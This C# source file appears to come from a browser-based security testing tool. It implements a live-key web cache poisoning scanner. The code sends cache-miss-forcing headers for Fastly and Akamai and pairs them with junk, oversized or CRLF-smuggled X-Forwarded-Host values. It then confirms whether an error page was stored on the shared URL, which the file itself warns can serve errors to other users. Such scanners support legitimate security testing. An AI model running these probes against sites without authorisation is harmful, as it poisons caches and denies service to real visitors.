using System.Diagnostics;
using System.Text;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Live-key error pollution: find a miss-forcing header on the clean URL, combine it with
/// error-inducing headers, then confirm with a fully clean GET (no query buster).
/// Inspired by PortSwigger web cache poisoning (unkeyed header → stored error on the shared URL).
/// Requires safetyMode active. A confirmed hit stores an error other users may receive.
/// </summary>
public sealed class CachePollutionScanner
{
    private static readonly (string Name, string Value, string Description)[] MissForceHeaders =
    [
        ("Pragma", "no-cache", "RFC 7234 Pragma: no-cache"),
        ("Cache-Control", "no-cache", "Request Cache-Control: no-cache"),
        ("Cache-Control", "max-age=0", "Request Cache-Control: max-age=0"),
        ("Cache-Control", "no-store", "Request Cache-Control: no-store"),
        ("Fastly-Force-Miss", "1", "Fastly force-miss gadget"),
        ("Pragma", "akamai-x-cache-on", "Akamai Pragma debug token"),
        ("Pragma", "akamai-x-get-cache-key", "Akamai cache-key debug token"),
        ("X-Refresh", "1", "X-Refresh force-miss gadget"),
    ];

    private static readonly (string Name, string Value, string Description)[] ErrorHeaders =
    [
        ("X-Forwarded-Host", "not-a-valid-host!!!!", "junk X-Forwarded-Host"),
        ("X-Forwarded-Host", new string('A', 4000), "oversized X-Forwarded-Host"),
        ("X-Original-URL", "http://invalid.invalid/trowser-pollute", "junk X-Original-URL"),
        ("X-Original-Host", "not-a-valid-host!!!!", "junk X-Original-Host"),
        ("X-Forwarded-Host", "evil.invalid\r\nX-Pollute: 1", "newline-smuggled X-Forwarded-Host"),
    ];

    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    public CachePollutionScanner(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public async Task<CachePollutionResult> RunAsync(CachePollutionOptions options, CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running cache-pollution.");

        var timeout = options.TimeoutMs > 0 ? options.TimeoutMs : 15000;
        var includeCookies = options.IncludeBrowserCookies;
        var replayDelay = options.CacheReplayDelayMs > 0 ? options.CacheReplayDelayMs : 300;
        var url = ResolveUrl(options, currentUri);
        var warnings = new List<string>
        {
            "Live-key scan: no query buster is added. A confirmed finding stores an error on the shared URL other users request."
        };
        var phase1 = new List<CachePollutionPhaseRow>();
        var phase2 = new List<CachePollutionPhaseRow>();
        var findings = new List<CachePollutionFinding>();
        var probesRun = 0;
        CachePollutionBypass? bypass = null;

        _log($"CachePollution: live URL {url} (no query buster)", "#888888");

        var baseline = await TryFetch(_ctx, url, null, timeout, includeCookies, ct);
        probesRun++;
        if (baseline == null)
        {
            sw.Stop();
            return Failed("Baseline GET of the live URL failed.", probesRun, sw.ElapsedMilliseconds, url, warnings);
        }

        var identify = CacheHeaderAnalyzer.Analyze(baseline.ResponseHeaders);
        if (!identify.Detected && !identify.Cacheable)
            warnings.Add("Identify did not see a cache on the baseline response. The identify step may still find a miss-forcing header.");

        var baselineHash = CacheHeaderAnalyzer.BodyHash(baseline.Body);
        var baselineStatus = baseline.Status;

        foreach (var (name, value, description) in MissForceHeaders)
        {
            ct.ThrowIfCancellationRequested();
            var probeHeaders = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase) { [name] = value };
            var probe = await TryFetch(_ctx, url, probeHeaders, timeout, includeCookies, ct);
            probesRun++;
            if (probe == null)
            {
                phase1.Add(Row("phase1", name, value, description, 0, "", "", "fetch-failed"));
                continue;
            }

            await Task.Delay(replayDelay, ct);
            var follow = await TryFetch(_ctx, url, null, timeout, includeCookies, ct);
            probesRun++;
            if (follow == null)
            {
                phase1.Add(Row("phase1", name, value, description, probe.Status,
                    CacheHeaderAnalyzer.Analyze(probe.ResponseHeaders).DocumentStatus, CacheHeaderAnalyzer.BodyHash(probe.Body),
                    "follow-up-failed"));
                continue;
            }

            var probeId = CacheHeaderAnalyzer.Analyze(probe.ResponseHeaders);
            var followId = CacheHeaderAnalyzer.Analyze(follow.ResponseHeaders);
            var probeHash = CacheHeaderAnalyzer.BodyHash(probe.Body);
            var followHash = CacheHeaderAnalyzer.BodyHash(follow.Body);
            var probeMiss = CacheHeaderAnalyzer.LooksLikeMiss(probe.ResponseHeaders)
                            || probeHash != baselineHash
                            || probe.Status != baselineStatus;
            var followIsNewHit = CacheHeaderAnalyzer.LooksLikeHit(follow.ResponseHeaders) && followHash == probeHash;
            var followIsOld = followHash == baselineHash && follow.Status == baselineStatus;

            string verdict;
            if (CacheHeaderAnalyzer.LooksLikeHit(probe.ResponseHeaders) && probeHash == baselineHash && probe.Status == baselineStatus)
            {
                verdict = "already-hit";
            }
            else if (probeMiss && followIsNewHit)
            {
                verdict = "force-revalidate-same-key";
            }
            else if (probeMiss && followIsOld)
            {
                verdict = "keyed-split";
            }
            else
            {
                verdict = probeMiss ? "miss-inconclusive" : "no-effect";
            }

            phase1.Add(new CachePollutionPhaseRow
            {
                Phase = "phase1",
                HeaderName = name,
                HeaderValue = Truncate(value, 80),
                Description = description,
                Status = probe.Status,
                CacheStatus = probeId.DocumentStatus,
                BodyHash = probeHash,
                FollowStatus = follow.Status,
                FollowCacheStatus = followId.DocumentStatus,
                FollowBodyHash = followHash,
                Verdict = verdict
            });

            if (verdict == "keyed-split")
            {
                findings.Add(new CachePollutionFinding
                {
                    Severity = "info",
                    Confidence = "likely",
                    Category = "cache-poison",
                    Indicator = "miss-header-keyed",
                    Url = url,
                    Title = $"{name} splits the cache key",
                    Detail = "Probe was a miss but the clean follow-up was still the old object. Not usable for live-key pollution."
                });
            }

            if (verdict == "force-revalidate-same-key" && bypass == null)
            {
                bypass = new CachePollutionBypass { Name = name, Value = value, Description = description };
                _log($"  Usable miss-forcing header: {name}: {Truncate(value, 40)}", "#4EC9B0");
                break;
            }
        }

        CachePollutionPhaseRow? phase3 = null;
        if (bypass == null)
        {
            warnings.Add("No miss-forcing header found. Stopped — will not fall back to query-string pollution.");
        }
        else
        {
            foreach (var (errName, errValue, errDesc) in ErrorHeaders)
            {
                ct.ThrowIfCancellationRequested();
                var combined = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
                {
                    [bypass.Name] = bypass.Value,
                    [errName] = errValue
                };

                SecurityProbeHttp.FetchResult? errResp;
                try
                {
                    errResp = await SecurityProbeHttp.FetchAsync(_ctx, url, "GET", combined, null, timeout, includeCookies, ct);
                }
                catch
                {
                    phase2.Add(Row("phase2", errName, errValue, errDesc, 0, "", "", "header-rejected"));
                    continue;
                }

                probesRun++;
                var errId = CacheHeaderAnalyzer.Analyze(errResp.ResponseHeaders);
                var isError = errResp.Status >= 400
                              || (CacheHeaderAnalyzer.BodyHash(errResp.Body) != baselineHash && LooksLikeErrorBody(errResp.Body));
                var storeable = CacheHeaderAnalyzer.HasCacheabilitySignal(errResp.ResponseHeaders)
                                && !IsNoStore(errResp.ResponseHeaders);
                var verdict = isError
                    ? storeable ? "origin-error-storeable" : "origin-error-not-storeable"
                    : "no-error";

                phase2.Add(new CachePollutionPhaseRow
                {
                    Phase = "phase2",
                    HeaderName = errName,
                    HeaderValue = Truncate(errValue, 80),
                    Description = $"{bypass.Name} + {errDesc}",
                    Status = errResp.Status,
                    CacheStatus = errId.DocumentStatus,
                    BodyHash = CacheHeaderAnalyzer.BodyHash(errResp.Body),
                    Verdict = verdict
                });

                if (!isError)
                    continue;

                await Task.Delay(replayDelay, ct);
                var clean = await TryFetch(_ctx, url, null, timeout, includeCookies, ct);
                probesRun++;
                if (clean == null)
                    continue;

                var cleanId = CacheHeaderAnalyzer.Analyze(clean.ResponseHeaders);
                var cleanHash = CacheHeaderAnalyzer.BodyHash(clean.Body);
                var errHash = CacheHeaderAnalyzer.BodyHash(errResp.Body);
                var errorPersisted = (clean.Status == errResp.Status && clean.Status >= 400)
                                     || (cleanHash == errHash && cleanHash != baselineHash);
                var cleanHit = CacheHeaderAnalyzer.LooksLikeHit(clean.ResponseHeaders);

                phase3 = new CachePollutionPhaseRow
                {
                    Phase = "phase3",
                    HeaderName = "(none)",
                    HeaderValue = "",
                    Description = "Fully clean GET of the same URL",
                    Status = clean.Status,
                    CacheStatus = cleanId.DocumentStatus,
                    BodyHash = cleanHash,
                    VersusStatus = errResp.Status,
                    VersusBodyHash = errHash,
                    Verdict = errorPersisted && cleanHit
                        ? "cache-error-stored"
                        : errorPersisted
                            ? "error-body-without-hit"
                            : "clean-ok"
                };

                if (errorPersisted && cleanHit)
                {
                    _log($"  FLAG cache-error-stored via {bypass.Name} + {errName}", "#F44747");
                    findings.Add(new CachePollutionFinding
                    {
                        Severity = "high",
                        Confidence = "confirmed",
                        Category = "cache-poison",
                        Indicator = "cache-error-stored",
                        Url = url,
                        Title = "Origin error stored on the live cache key",
                        Detail = $"Bypass {bypass.Name}: {Truncate(bypass.Value, 40)}; error via {errName}. "
                                 + $"Error replay HTTP {errResp.Status}, clean GET HTTP {clean.Status} ({cleanId.DocumentStatus}).",
                        BypassHeader = bypass.Name,
                        ErrorHeader = errName,
                        PoisonStatus = errResp.Status,
                        CleanStatus = clean.Status,
                        CacheHeaders = CacheHeaderAnalyzer.FormatCacheHeadersPair(
                            errResp.ResponseHeaders, clean.ResponseHeaders, "phase2", "clean")
                    });
                    break;
                }

                if (isError && !errorPersisted)
                {
                    findings.Add(new CachePollutionFinding
                    {
                        Severity = "info",
                        Confidence = "likely",
                        Category = "cache-poison",
                        Indicator = "origin-error-not-stored",
                        Url = url,
                        Title = "Origin errors but they are not stored",
                        Detail = $"{errName} produced HTTP {errResp.Status} with the bypass header, but the clean GET was fine (keyed error header or uncacheable error).",
                        BypassHeader = bypass.Name,
                        ErrorHeader = errName,
                        PoisonStatus = errResp.Status,
                        CleanStatus = clean.Status
                    });
                }
            }
        }

        var next = new List<string>();
        if (bypass != null)
        {
            next.Add($"POST /api/security/cache-poison-scan with bypassHeader={bypass.Name} for unkeyed reflection (XSS-style) on the live key.");
            next.Add("POST /api/security/cache-deception-scan if the session is authenticated.");
        }

        sw.Stop();
        var confirmed = findings.Count(f => f.Indicator == "cache-error-stored");
        var message = bypass == null
            ? $"No miss-forcing header on the live URL ({probesRun} probe(s))."
            : confirmed > 0
                ? $"Confirmed live-key error stored ({confirmed}) via {bypass.Name} ({probesRun} probe(s))."
                : $"Usable bypass {bypass.Name}; no stored error confirmed ({probesRun} probe(s)).";

        return new CachePollutionResult
        {
            Message = message,
            Url = url,
            ProbesRun = probesRun,
            ElapsedMs = sw.ElapsedMilliseconds,
            Identify = identify,
            BypassHeader = bypass,
            Phase1 = phase1,
            Phase2 = phase2,
            Phase3 = phase3,
            Findings = findings,
            Warnings = warnings,
            NextActions = next
        };
    }

    private static CachePollutionResult Failed(
        string message, int probes, long elapsed, string url, List<string> warnings) =>
        new()
        {
            Message = message,
            Url = url,
            ProbesRun = probes,
            ElapsedMs = elapsed,
            Warnings = warnings
        };

    private static string ResolveUrl(CachePollutionOptions options, Uri currentUri)
    {
        if (options.Urls is { Count: > 0 } && Uri.TryCreate(options.Urls[0], UriKind.Absolute, out var explicitUri))
            return explicitUri.GetLeftPart(UriPartial.Path) + explicitUri.Query;
        return currentUri.GetLeftPart(UriPartial.Path) + currentUri.Query;
    }

    private static CachePollutionPhaseRow Row(
        string phase, string name, string value, string desc, int status, string cache, string hash, string verdict) =>
        new()
        {
            Phase = phase,
            HeaderName = name,
            HeaderValue = Truncate(value, 80),
            Description = desc,
            Status = status,
            CacheStatus = cache,
            BodyHash = hash,
            Verdict = verdict
        };

    private static async Task<SecurityProbeHttp.FetchResult?> TryFetch(
        AutomationContext ctx, string url, IReadOnlyDictionary<string, string>? headers,
        int timeout, bool cookies, CancellationToken ct)
    {
        try
        {
            return await SecurityProbeHttp.FetchAsync(ctx, url, "GET", headers, null, timeout, cookies, ct);
        }
        catch
        {
            return null;
        }
    }

    private static bool LooksLikeErrorBody(string body)
    {
        if (string.IsNullOrEmpty(body)) return false;
        return body.Contains("exception", StringComparison.OrdinalIgnoreCase)
               || body.Contains("stack trace", StringComparison.OrdinalIgnoreCase)
               || body.Contains("internal server error", StringComparison.OrdinalIgnoreCase)
               || body.Contains("bad request", StringComparison.OrdinalIgnoreCase)
               || body.Contains("invalid host", StringComparison.OrdinalIgnoreCase);
    }

    private static bool IsNoStore(IReadOnlyDictionary<string, string> headers)
    {
        return CacheHeaderAnalyzer.TryGet(headers, "Cache-Control", out var cc)
               && cc.Contains("no-store", StringComparison.OrdinalIgnoreCase);
    }

    private static string Truncate(string s, int max) =>
        s.Length <= max ? s : s[..max] + "...";
}

public sealed class CachePollutionOptions
{
    public List<string>? Urls { get; init; }
    public int TimeoutMs { get; init; } = 15000;
    public int CacheReplayDelayMs { get; init; } = 300;
    public bool IncludeBrowserCookies { get; init; }
}

public sealed class CachePollutionBypass
{
    public string Name { get; init; } = "";
    public string Value { get; init; } = "";
    public string Description { get; init; } = "";
}

public sealed class CachePollutionPhaseRow
{
    public string Phase { get; init; } = "";
    public string HeaderName { get; init; } = "";
    public string HeaderValue { get; init; } = "";
    public string Description { get; init; } = "";
    public int Status { get; init; }
    public string CacheStatus { get; init; } = "";
    public string BodyHash { get; init; } = "";
    public int FollowStatus { get; init; }
    public string FollowCacheStatus { get; init; } = "";
    public string FollowBodyHash { get; init; } = "";
    public int VersusStatus { get; init; }
    public string VersusBodyHash { get; init; } = "";
    public string Verdict { get; init; } = "";
}

public sealed class CachePollutionFinding
{
    public string Severity { get; init; } = "high";
    public string Confidence { get; init; } = "confirmed";
    public string Category { get; init; } = "cache-poison";
    public string Indicator { get; init; } = "";
    public string Url { get; init; } = "";
    public string Title { get; init; } = "";
    public string Detail { get; init; } = "";
    public string? BypassHeader { get; init; }
    public string? ErrorHeader { get; init; }
    public int PoisonStatus { get; init; }
    public int CleanStatus { get; init; }
    public string CacheHeaders { get; init; } = "";
}

public sealed class CachePollutionResult
{
    public string Message { get; init; } = "";
    public string Url { get; init; } = "";
    public int ProbesRun { get; init; }
    public long ElapsedMs { get; init; }
    public CacheIdentifySummary Identify { get; init; } = new();
    public CachePollutionBypass? BypassHeader { get; init; }
    public List<CachePollutionPhaseRow> Phase1 { get; init; } = [];
    public List<CachePollutionPhaseRow> Phase2 { get; init; } = [];
    public CachePollutionPhaseRow? Phase3 { get; init; }
    public List<CachePollutionFinding> Findings { get; init; } = [];
    public List<string> Warnings { get; init; } = [];
    public List<string> NextActions { get; init; } = [];

    public bool HasConfirmedIssue =>
        Findings.Any(f => f.Indicator == "cache-error-stored" && f.Confidence == "confirmed");

    public string Format(bool includeDetails = true)
    {
        var sb = new StringBuilder();
        sb.AppendLine("=== Cache Pollution (live-key) ===");
        sb.AppendLine(Message);
        sb.AppendLine($"URL: {Url}");
        if (Identify.Detected)
            sb.AppendLine($"Identify: {Identify.DocumentStatus} vendors={string.Join(",", Identify.Vendors)}");
        if (BypassHeader != null)
            sb.AppendLine($"Bypass: {BypassHeader.Name}: {BypassHeader.Value} ({BypassHeader.Description})");
        foreach (var w in Warnings)
            sb.AppendLine($"WARNING: {w}");
        if (Findings.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("FINDINGS:");
            foreach (var f in Findings)
            {
                sb.AppendLine($"  [{f.Severity}/{f.Confidence}] {f.Indicator}: {f.Title}");
                if (includeDetails)
                    sb.AppendLine($"    {f.Detail}");
            }
        }

        if (includeDetails)
        {
            if (Phase1.Count > 0)
            {
                sb.AppendLine();
                sb.AppendLine("PHASE 1 (miss-forcing header):");
                foreach (var r in Phase1)
                    sb.AppendLine($"  {r.HeaderName}: {r.Verdict} probe={r.CacheStatus}/{r.Status} follow={r.FollowCacheStatus}/{r.FollowStatus}");
            }

            if (Phase2.Count > 0)
            {
                sb.AppendLine();
                sb.AppendLine("PHASE 2 (bypass + error headers):");
                foreach (var r in Phase2)
                    sb.AppendLine($"  {r.HeaderName}: {r.Verdict} HTTP {r.Status} {r.CacheStatus}");
            }

            if (Phase3 != null)
            {
                sb.AppendLine();
                sb.AppendLine($"PHASE 3 (clean GET): {Phase3.Verdict} HTTP {Phase3.Status} {Phase3.CacheStatus}");
            }
        }

        if (NextActions.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("NEXT:");
            foreach (var n in NextActions)
                sb.AppendLine($"  {n}");
        }

        sb.AppendLine("==================================");
        return sb.ToString();
    }
}
